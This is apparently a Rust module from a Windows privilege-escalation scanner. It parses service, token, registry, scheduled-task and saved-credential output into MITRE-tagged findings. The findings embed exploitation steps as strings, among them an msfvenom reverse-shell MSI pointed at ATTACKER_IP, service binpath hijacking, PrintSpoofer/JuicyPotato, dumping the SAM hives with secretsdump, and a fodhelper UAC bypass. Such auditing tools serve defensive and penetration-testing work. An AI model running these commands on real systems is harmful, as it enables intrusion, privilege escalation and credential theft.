#![allow(dead_code)]

use regex::Regex;
use super::types::*;

/// Common exploitable service permissions
const DANGEROUS_SERVICE_PERMISSIONS: &[&str] = &[
    "SERVICE_ALL_ACCESS",
    "SERVICE_CHANGE_CONFIG",
    "WRITE_DAC",
    "WRITE_OWNER",
    "GENERIC_WRITE",
    "GENERIC_ALL",
];

/// Exploitable token privileges
const DANGEROUS_PRIVILEGES: &[(&str, &str)] = &[
    ("SeImpersonatePrivilege", "Potato attacks (JuicyPotato, PrintSpoofer, etc.)"),
    ("SeAssignPrimaryTokenPrivilege", "Token manipulation"),
    ("SeTcbPrivilege", "Part of the operating system"),
    ("SeBackupPrivilege", "Read any file"),
    ("SeRestorePrivilege", "Write any file"),
    ("SeCreateTokenPrivilege", "Create tokens"),
    ("SeLoadDriverPrivilege", "Load kernel drivers"),
    ("SeTakeOwnershipPrivilege", "Take ownership of any object"),
    ("SeDebugPrivilege", "Debug any process"),
];

/// Parse unquoted service paths from output
pub fn parse_unquoted_service_paths(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let path_regex = Regex::new(r"(?i)SERVICE_NAME:\s*(\S+)").ok();
    let binary_regex = Regex::new(r"(?i)BINARY_PATH_NAME\s*:\s*(.+)").ok();

    let mut current_service: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();

        // Extract service name
        if let Some(ref regex) = path_regex {
            if let Some(caps) = regex.captures(line) {
                current_service = caps.get(1).map(|m| m.as_str().to_string());
            }
        }

        // Extract binary path
        if let Some(ref regex) = binary_regex {
            if let Some(caps) = regex.captures(line) {
                if let Some(path) = caps.get(1) {
                    let path_str = path.as_str().trim();

                    // Check for unquoted path with spaces
                    if !path_str.starts_with('"')
                        && path_str.contains(' ')
                        && !path_str.starts_with("\\??\\")
                    {
                        // Path has spaces but no quotes - potentially exploitable
                        let service_name = current_service
                            .clone()
                            .unwrap_or_else(|| "Unknown".to_string());

                        let mut finding = PrivescFinding::new_windows(
                            PrivescSeverity::High,
                            format!("Unquoted Service Path: {}", service_name),
                            format!(
                                "Service '{}' has an unquoted binary path with spaces: '{}'. \
                                 This can be exploited by placing a malicious executable in the path.",
                                service_name, path_str
                            ),
                            WindowsPrivescVector::UnquotedServicePath {
                                service: service_name.clone(),
                                path: path_str.to_string(),
                                can_restart: false, // Would need additional checks
                            },
                        );

                        // Generate exploitation path
                        let spaces: Vec<_> = path_str.match_indices(' ').collect();
                        if !spaces.is_empty() {
                            let first_space = spaces[0].0;
                            let exploit_path = format!("{}.exe", &path_str[..first_space]);
                            finding.exploitation_steps = vec![
                                format!("Create malicious executable at: {}", exploit_path),
                                format!("Restart service: sc stop {} && sc start {}", service_name, service_name),
                                "The malicious executable will run with service privileges".to_string(),
                            ];
                        }

                        finding.mitre_techniques.push("T1574.009".to_string()); // Path Interception by Unquoted Path

                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Parse weak service permissions
pub fn parse_weak_service_permissions(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let service_regex = Regex::new(r"(?i)SERVICE\s+(\S+)").ok();
    let perm_regex = Regex::new(r"(?i)(SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG|WRITE_DAC|WRITE_OWNER|GENERIC_WRITE|GENERIC_ALL)").ok();

    for line in output.lines() {
        let line = line.trim();

        // Check for dangerous permissions
        if let Some(ref perm_rx) = perm_regex {
            if let Some(perm_match) = perm_rx.find(line) {
                let permission = perm_match.as_str();

                // Try to extract service name
                let service_name = if let Some(ref svc_rx) = service_regex {
                    svc_rx
                        .captures(line)
                        .and_then(|c| c.get(1))
                        .map(|m| m.as_str().to_string())
                        .unwrap_or_else(|| "Unknown".to_string())
                } else {
                    "Unknown".to_string()
                };

                // Extract identity (user/group with this permission)
                let identity = line
                    .split_whitespace()
                    .find(|s| s.contains('\\') || s.contains("BUILTIN"))
                    .unwrap_or("Unknown User")
                    .to_string();

                let mut finding = PrivescFinding::new_windows(
                    PrivescSeverity::High,
                    format!("Weak Service Permission: {}", service_name),
                    format!(
                        "Service '{}' has weak permission '{}' granted to '{}'. \
                         This allows modifying the service configuration.",
                        service_name, permission, identity
                    ),
                    WindowsPrivescVector::WeakServicePermission {
                        service: service_name.clone(),
                        permission: permission.to_string(),
                        identity: identity.clone(),
                    },
                );

                finding.exploitation_steps = vec![
                    format!("sc config {} binpath= \"C:\\Windows\\Temp\\malicious.exe\"", service_name),
                    format!("sc stop {}", service_name),
                    format!("sc start {}", service_name),
                ];

                finding.mitre_techniques.push("T1574.011".to_string()); // Services File Permissions Weakness

                findings.push(finding);
            }
        }
    }

    findings
}

/// Check for AlwaysInstallElevated registry key
pub fn parse_always_install_elevated(output: &str) -> Option<PrivescFinding> {
    let hkcu = output.contains("HKEY_CURRENT_USER") && output.contains("AlwaysInstallElevated")
        && output.contains("0x1");
    let hklm = output.contains("HKEY_LOCAL_MACHINE") && output.contains("AlwaysInstallElevated")
        && output.contains("0x1");

    if hkcu && hklm {
        let mut finding = PrivescFinding::new_windows(
            PrivescSeverity::Critical,
            "AlwaysInstallElevated Enabled".to_string(),
            "AlwaysInstallElevated is enabled in both HKCU and HKLM. \
             This allows any user to install MSI packages with SYSTEM privileges."
                .to_string(),
            WindowsPrivescVector::AlwaysInstallElevated { hkcu, hklm },
        );

        finding.exploitation_steps = vec![
            "Generate malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > evil.msi".to_string(),
            "Install MSI: msiexec /quiet /qn /i evil.msi".to_string(),
            "The payload will execute with SYSTEM privileges".to_string(),
        ];

        finding.mitre_techniques.push("T1548.002".to_string()); // Bypass User Access Control
        finding.references.push("https://attack.mitre.org/techniques/T1548/002/".to_string());

        return Some(finding);
    }

    None
}

/// Parse token privileges
pub fn parse_token_privileges(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    // Match privilege name followed by any text and then Enabled/Disabled at end of line
    let priv_regex = Regex::new(r"(?i)(Se\w+Privilege)\s+.*\s+(Enabled|Disabled)\s*$").ok();

    for line in output.lines() {
        let line = line.trim();

        if let Some(ref regex) = priv_regex {
            if let Some(caps) = regex.captures(line) {
                let privilege = caps.get(1).map(|m| m.as_str()).unwrap_or("");
                let enabled = caps
                    .get(2)
                    .map(|m| m.as_str().to_lowercase() == "enabled")
                    .unwrap_or(false);

                // Check if it's a dangerous privilege
                if let Some((_, technique)) = DANGEROUS_PRIVILEGES.iter().find(|(p, _)| *p == privilege) {
                    if enabled {
                        let severity = if privilege == "SeImpersonatePrivilege"
                            || privilege == "SeAssignPrimaryTokenPrivilege"
                        {
                            PrivescSeverity::Critical
                        } else {
                            PrivescSeverity::High
                        };

                        let mut finding = PrivescFinding::new_windows(
                            severity,
                            format!("Token Privilege: {}", privilege),
                            format!(
                                "Dangerous privilege '{}' is enabled. Technique: {}",
                                privilege, technique
                            ),
                            WindowsPrivescVector::TokenPrivilege {
                                privilege: privilege.to_string(),
                                exploitable: true,
                                technique: technique.to_string(),
                            },
                        );

                        if privilege == "SeImpersonatePrivilege" {
                            finding.exploitation_steps = vec![
                                "Use JuicyPotato, PrintSpoofer, or similar tool".to_string(),
                                "PrintSpoofer.exe -i -c \"cmd /c whoami\"".to_string(),
                                "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *".to_string(),
                            ];
                            finding.references.push(
                                "https://github.com/itm4n/PrintSpoofer".to_string(),
                            );
                        } else if privilege == "SeBackupPrivilege" {
                            finding.exploitation_steps = vec![
                                "Use privilege to read SAM and SYSTEM registry hives".to_string(),
                                "reg save HKLM\\SAM sam.hive".to_string(),
                                "reg save HKLM\\SYSTEM system.hive".to_string(),
                                "Extract hashes: secretsdump.py -sam sam.hive -system system.hive LOCAL".to_string(),
                            ];
                        }

                        finding.mitre_techniques.push("T1134".to_string()); // Access Token Manipulation

                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Parse scheduled tasks for hijacking opportunities
pub fn parse_scheduled_tasks(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let task_regex = Regex::new(r"(?i)TaskName:\s*(.+)").ok();
    let path_regex = Regex::new(r"(?i)Task To Run:\s*(.+)").ok();

    let mut current_task: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();

        if let Some(ref regex) = task_regex {
            if let Some(caps) = regex.captures(line) {
                current_task = caps.get(1).map(|m| m.as_str().trim().to_string());
            }
        }

        if let Some(ref regex) = path_regex {
            if let Some(caps) = regex.captures(line) {
                if let Some(path) = caps.get(1) {
                    let path_str = path.as_str().trim();

                    // Check for potentially writable locations
                    let potentially_writable = path_str.contains("Users")
                        || path_str.contains("Temp")
                        || path_str.contains("AppData")
                        || path_str.contains("Public")
                        || !path_str.starts_with("C:\\Windows");

                    if potentially_writable {
                        let task_name = current_task
                            .clone()
                            .unwrap_or_else(|| "Unknown".to_string());

                        let finding = PrivescFinding::new_windows(
                            PrivescSeverity::Medium,
                            format!("Scheduled Task: {}", task_name),
                            format!(
                                "Scheduled task '{}' runs from potentially writable location: {}",
                                task_name, path_str
                            ),
                            WindowsPrivescVector::ScheduledTaskHijack {
                                task: task_name,
                                path: path_str.to_string(),
                                writable: false, // Would need to verify
                            },
                        );

                        findings.push(finding);
                    }
                }
            }
        }
    }

    findings
}

/// Parse unattended install files
pub fn parse_unattended_files(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let interesting_files = [
        "unattend.xml",
        "unattend.txt",
        "sysprep.xml",
        "sysprep.inf",
        "autounattend.xml",
        "Unattended.xml",
        "Groups.xml",
        "Services.xml",
        "Scheduledtasks.xml",
        "DataSources.xml",
        "Printers.xml",
        "Drives.xml",
    ];

    for line in output.lines() {
        let line = line.trim();
        let line_lower = line.to_lowercase();

        for file in &interesting_files {
            if line_lower.contains(&file.to_lowercase()) {
                let mut finding = PrivescFinding::new_windows(
                    PrivescSeverity::High,
                    format!("Unattended Install File: {}", file),
                    format!(
                        "Found unattended installation file '{}' which may contain credentials: {}",
                        file, line
                    ),
                    WindowsPrivescVector::UnattendedInstall {
                        path: line.to_string(),
                        contains_credentials: false, // Would need to verify
                    },
                );

                finding.exploitation_steps = vec![
                    format!("Read the file: type \"{}\"", line),
                    "Look for <UserAccounts>, <LocalAccounts>, or <AdministratorPassword> tags".to_string(),
                    "Credentials may be base64 encoded".to_string(),
                ];

                finding.mitre_techniques.push("T1552.001".to_string()); // Unsecured Credentials: Credentials In Files

                findings.push(finding);
                break;
            }
        }
    }

    findings
}

/// Parse registry for stored credentials
pub fn parse_registry_credentials(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let interesting_keys = [
        ("DefaultPassword", "Autologon password"),
        ("VNCPassword", "VNC password"),
        ("Password", "Stored password"),
        ("AltDefaultPassword", "Alternate autologon password"),
    ];

    for line in output.lines() {
        let line = line.trim();

        for (key, description) in &interesting_keys {
            if line.contains(key) && !line.ends_with("REG_SZ") {
                let mut finding = PrivescFinding::new_windows(
                    PrivescSeverity::High,
                    format!("Registry Credential: {}", description),
                    format!("Found {} in registry: {}", description, line),
                    WindowsPrivescVector::RegistryCredential {
                        path: line.to_string(),
                        value_name: key.to_string(),
                    },
                );

                finding.mitre_techniques.push("T1552.002".to_string()); // Unsecured Credentials: Credentials in Registry

                findings.push(finding);
                break;
            }
        }
    }

    findings
}

/// Parse saved credentials (cmdkey /list)
pub fn parse_saved_credentials(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();
    let target_regex = Regex::new(r"(?i)Target:\s*(.+)").ok();
    let user_regex = Regex::new(r"(?i)User:\s*(.+)").ok();

    let mut current_target: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();

        if let Some(ref regex) = target_regex {
            if let Some(caps) = regex.captures(line) {
                current_target = caps.get(1).map(|m| m.as_str().trim().to_string());
            }
        }

        if let Some(ref regex) = user_regex {
            if let Some(caps) = regex.captures(line) {
                if let Some(user) = caps.get(1) {
                    let target = current_target
                        .clone()
                        .unwrap_or_else(|| "Unknown".to_string());

                    let mut finding = PrivescFinding::new_windows(
                        PrivescSeverity::Medium,
                        format!("Saved Credential: {}", target),
                        format!("Saved credential found for target '{}' with user '{}'", target, user.as_str()),
                        WindowsPrivescVector::SavedCredentials {
                            target: target.clone(),
                            username: user.as_str().to_string(),
                        },
                    );

                    finding.exploitation_steps = vec![
                        format!("Use runas with saved credential: runas /savecred /user:{} cmd", user.as_str()),
                    ];

                    finding.mitre_techniques.push("T1552.001".to_string());

                    findings.push(finding);
                }
            }
        }
    }

    findings
}

/// Check for UAC bypass opportunities
pub fn check_uac_bypass_potential(output: &str) -> Vec<PrivescFinding> {
    let mut findings = Vec::new();

    // Check if UAC is enabled but at lower level
    if output.contains("EnableLUA") && output.contains("0x1")
        && output.contains("ConsentPromptBehaviorAdmin")
    {
        // Check consent behavior
        let consent_level = if output.contains("ConsentPromptBehaviorAdmin")
            && output.contains("0x0")
        {
            "Elevate without prompting"
        } else if output.contains("ConsentPromptBehaviorAdmin")
            && output.contains("0x5")
        {
            "Prompt for consent on secure desktop"
        } else {
            "Unknown"
        };

        if output.contains("0x0") || output.contains("0x1") || output.contains("0x3") {
            // Lower UAC settings - bypass possible
            let mut finding = PrivescFinding::new_windows(
                PrivescSeverity::Medium,
                "UAC Bypass Potential".to_string(),
                format!(
                    "UAC settings may allow bypass. Consent behavior: {}",
                    consent_level
                ),
                WindowsPrivescVector::UacBypass {
                    technique: "fodhelper/eventvwr".to_string(),
                    binary: "fodhelper.exe".to_string(),
                },
            );

            finding.exploitation_steps = vec![
                "Set registry key: reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe\" /f".to_string(),
                "Set DelegateExecute: reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f".to_string(),
                "Trigger: fodhelper.exe".to_string(),
                "Clean up: reg delete HKCU\\Software\\Classes\\ms-settings /f".to_string(),
            ];

            finding.mitre_techniques.push("T1548.002".to_string());

            findings.push(finding);
        }
    }

    findings
}

/// Parse system info from Windows commands
pub fn parse_windows_system_info(systeminfo_output: &str, whoami_output: &str) -> SystemInfo {
    let mut info = SystemInfo::default();

    // Parse systeminfo
    for line in systeminfo_output.lines() {
        let line = line.trim();
        if line.starts_with("Host Name:") {
            info.hostname = Some(line.replace("Host Name:", "").trim().to_string());
        } else if line.starts_with("OS Name:") {
            info.os_name = Some(line.replace("OS Name:", "").trim().to_string());
        } else if line.starts_with("OS Version:") {
            info.os_version = Some(line.replace("OS Version:", "").trim().to_string());
        } else if line.starts_with("System Type:") {
            info.architecture = Some(line.replace("System Type:", "").trim().to_string());
        }
    }

    // Parse whoami /all
    if let Some(user_line) = whoami_output.lines().find(|l| l.contains('\\')) {
        let parts: Vec<&str> = user_line.split_whitespace().collect();
        if !parts.is_empty() {
            info.current_user = Some(parts[0].to_string());
        }
    }

    // Extract groups from whoami /groups
    let groups_section = whoami_output
        .lines()
        .skip_while(|l| !l.contains("GROUP INFORMATION"))
        .skip(3) // Skip header
        .take_while(|l| !l.trim().is_empty())
        .filter_map(|l| l.split_whitespace().next())
        .map(|s| s.to_string())
        .collect();
    info.current_groups = groups_section;

    info
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_unquoted_service_paths() {
        let output = r#"
SERVICE_NAME: TestService
        BINARY_PATH_NAME   : C:\Program Files\Test App\service.exe
"#;
        let findings = parse_unquoted_service_paths(output);
        assert!(!findings.is_empty());
        assert!(findings[0].title.contains("Unquoted"));
    }

    #[test]
    fn test_parse_token_privileges() {
        let output = r#"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client           Enabled
SeShutdownPrivilege           Shut down the system           Disabled
"#;
        let findings = parse_token_privileges(output);
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.title.contains("SeImpersonatePrivilege")));
    }
}
